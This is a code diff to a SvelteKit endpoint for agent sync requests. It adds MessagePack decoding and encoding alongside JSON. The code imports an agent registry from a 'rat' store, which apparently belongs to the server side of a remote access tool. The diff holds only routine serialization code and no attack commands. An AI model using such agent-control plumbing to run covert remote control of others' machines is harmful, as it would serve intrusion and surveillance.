@@ -2,6 +2,7 @@ import { json, error } from '@sveltejs/kit';
 import type { RequestHandler } from './$types';
 import { registry, RegistryError } from '$lib/server/rat/store';
 import type { AgentSyncRequest } from '../../../../../../../shared/types/messages';
+import { decode, encode } from '@msgpack/msgpack';
 
 function getBearerToken(header: string | null): string | undefined {
 	if (!header) {
@@ -19,7 +20,13 @@ export const POST: RequestHandler = async ({ params, request, getClientAddress }
 
 	let payload: AgentSyncRequest;
 	try {
-		payload = (await request.json()) as AgentSyncRequest;
+		const contentType = request.headers.get('content-type') || '';
+		if (contentType.includes('application/msgpack')) {
+			const buffer = await request.arrayBuffer();
+			payload = decode(buffer) as AgentSyncRequest;
+		} else {
+			payload = (await request.json()) as AgentSyncRequest;
+		}
 	} catch {
 		throw error(400, 'Invalid sync payload');
 	}
@@ -33,6 +40,14 @@ export const POST: RequestHandler = async ({ params, request, getClientAddress }
 		const response = await registry.syncAgent(id, token, payload, {
 			remoteAddress: getClientAddress()
 		});
+
+		const accept = request.headers.get('accept') || '';
+		if (accept.includes('application/msgpack')) {
+			return new Response(encode(response) as BodyInit, {
+				headers: { 'Content-Type': 'application/msgpack' }
+			});
+		}
+
 		return json(response);
 	} catch (err) {
 		if (err instanceof RegistryError) {
